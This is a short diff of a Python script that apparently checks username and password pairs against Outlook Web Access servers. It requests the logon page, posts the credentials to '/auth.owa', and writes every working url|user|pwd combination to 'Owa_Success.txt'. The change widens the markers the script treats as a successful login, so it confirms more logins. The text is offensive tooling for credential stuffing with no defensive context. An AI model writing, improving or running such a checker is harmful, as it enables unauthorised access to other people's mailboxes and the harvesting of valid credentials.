@@ -34,10 +34,10 @@ def checkowa(string):
 		"passwordText":"",
 		"isUtf8": "1"}
 		janco = requests.get(url+ '/auth/logon.aspx', headers=headers,timeout=15).content
-		if 'Outlook</title' in janco:
+		if 'Outlook</title' in janco or '<title>Outlook' in janco or 'Outlook' in janco:
 			asu = requests.post(url+'/auth.owa',data=data,headers=headers,allow_redirects=True,timeout=15).content
 			asuu = requests.get(url+'/',headers=headers,allow_redirects=False,timeout=15)
-			if '/owa/logoff.owa' in asu:
+			if '/owa/logoff.owa' in asu or '<title>Inbox' in asu or 'Inbox' in asu or 'Connected to Microsoft Exchange' in asu or 'ASP.forms_basic_basicmessageview_aspx' in asu:
 				print(Fore.GREEN +"[Success Login] ==> "+" "+ Fore.RESET+ url+'|'+user+'|'+pwd)
 				open("Owa_Success.txt","a").write(url+'|'+user+'|'+pwd+"\n")
 			else:
